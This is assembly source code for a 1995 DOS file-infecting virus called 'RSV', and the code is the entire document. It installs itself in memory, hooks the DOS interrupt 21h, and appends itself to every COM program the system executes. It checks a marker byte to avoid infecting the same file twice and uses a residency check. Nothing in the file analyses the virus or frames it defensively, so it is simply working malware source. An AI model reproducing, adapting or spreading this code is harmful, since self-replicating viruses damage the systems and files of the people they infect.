;
;  RSV - written by Conzouler 1995
;
;  memory resident
;  com-append on execute
;  no tb-flags
;  no impressive features...
;

.model tiny
.code
.286
 org 100h

psize   equ     (offset last - offset entry) / 10h + 1
size    equ     offset last - offset entry

entry:
        db      0e9h,0,0
start:
        call    gores

oentry  db      0CDh,20h,90h

gores:
        mov     ax, 4277h
        int     21h
        jnc     restore

        mov     ah, 4Ah
        mov     bx, 0FFFFh
        int     21h
        mov     ah, 4Ah
        sub     bx, psize+1
        int     21h
        mov     ah, 48h
        mov     bx, psize
        int     21h
        sub     ax, 10h
        mov     es, ax
        mov     word ptr es:[0F1h], 8
        mov     di, 103h
        mov     bp, sp
        mov     si, ss:[bp]
        sub     si, 3
        mov     cx, size-3
        rep     movsb
        push    es
        pop     ds
        mov     ax, 3521h
        int     21h
        mov     i21o, bx
        mov     i21s, es
        mov     ah, 25h
        mov     dx, offset vec21
        int     21h

restore:
        push    cs
        pop     ds
        push    ds
        pop     es
        pop     si
        mov     di, 100h
        push    di
        movsw
        movsb
        retn

i21:    db      0eAh
i21o    dw      ?
i21s    dw      ?

vec21:
        cmp     ax, 4277h
        jne     v21e
        clc
        retf    2
v21e:   cmp     ax, 4B00h
        je      infect
v21x:
        jmp     i21


infect:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    ds

        mov     ax, 3D82h
        int     21h
        xchg    ax, bx

        push    cs
        pop     ds
        mov     ah, 3Fh
        mov     dx, offset oentry
        mov     cx, 3
        int     21h
        cmp     byte ptr oentry, 'M'
        je      infectx

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h
        dec     ax
        mov     si, ax
        xchg    dx, ax
        mov     ax, 4200h
        int     21h
        mov     dx, offset last
        mov     ah, 3Fh
        mov     cx, 1
        int     21h
        cmp     byte ptr last, 087h
        je      infectx

        xchg    ax, si
        sub     ax, 2
        mov     byte ptr entry, 0E9h
        mov     word ptr entry[1], ax

        mov     ah, 3Fh
        inc     ah
        push    ax
        mov     dx, 103h
        mov     cx, size-3
        int     21h

        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        pop     ax
        mov     dx, 100h
        mov     cx, 3
        int     21h
infectx:
        mov     ah, 3Eh
        int     21h

        pop     ds
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     v21x

last:
end     entry




